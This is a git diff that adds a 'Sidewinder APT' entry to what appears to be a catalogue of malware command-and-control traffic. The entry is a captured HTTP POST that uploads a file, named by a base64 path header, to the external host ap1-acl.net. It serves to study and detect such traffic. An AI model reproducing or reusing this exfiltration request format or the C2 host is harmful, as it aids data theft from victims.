@@ -2377,6 +2377,28 @@ key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")
 
+#### Sidewinder APT
+~~~
+HTTP/1.1 100 Continue
+
+POST /202/KfzLXf6NisWqPtYOrrQYJfzErkCyS8ib8dz3QSsN/1115/2280/16331af8 HTTP/1.1
+X-File-Path: QzpcV2luZG93c1xTaGVsbE5ld1xFWENFTDEyLlhMU1g=
+X-File-Offset: 0
+X-File-Length: 8746
+Content-Type: application/x-raw
+Content-Encoding: gzip
+Host: ap1-acl.net
+Content-Length: 7801
+Expect: 100-continue
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+
+PK..
+......d35............	...docProps/SDt..........>;cd`i.a``Pa... fd.3Y.......
+........*.g.?.i/..cbX....e.`..(....Y.".....S8.r.\. .U...5w%...ZE..I.....0q&,..UT
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sidewinder.png "Sidewinder")
+
 #### Smokeloader
 ~~~
 POST / HTTP/1.1
